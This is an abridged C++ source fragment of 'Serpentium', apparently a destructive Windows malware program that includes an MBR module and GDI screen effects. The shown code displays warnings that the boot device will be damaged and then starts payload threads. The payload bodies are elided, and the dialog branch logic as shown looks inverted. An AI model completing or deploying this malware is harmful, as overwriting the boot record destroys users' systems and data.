// Serpentium.cpp : Defines the entry point for the application.
//

#include "Serpentium.h"
#include "gdi.h"
#include "bytebeat.h"
#include "MBR.h"
...
int WINAPI WinMain(HINSTANCE hia,
	...
	if (MessageBoxW(NULL, L"Fair Warning!, Run A Malware For Sure?, \nAre you sure to run dangerous malware, you will unstable boot device,\n do you run during a malware, for an test malware? \n Are You Sure?", L"Serpentium.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		...
		if (MessageBoxW(NULL, L"This Is The Last Warning!, Are You Sure? \nP. ĐĂNG will not be responsible for any of the damage caused!", L"Serpentium.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			...
			Sleep(5000);
			HANDLE ohno = CreateThread(0, 0, OhNo, 0, 0, 0);
			// gdi start
			HANDLE gdi0 = CreateThread(0, 0, BGDI, 0, 0, 0);
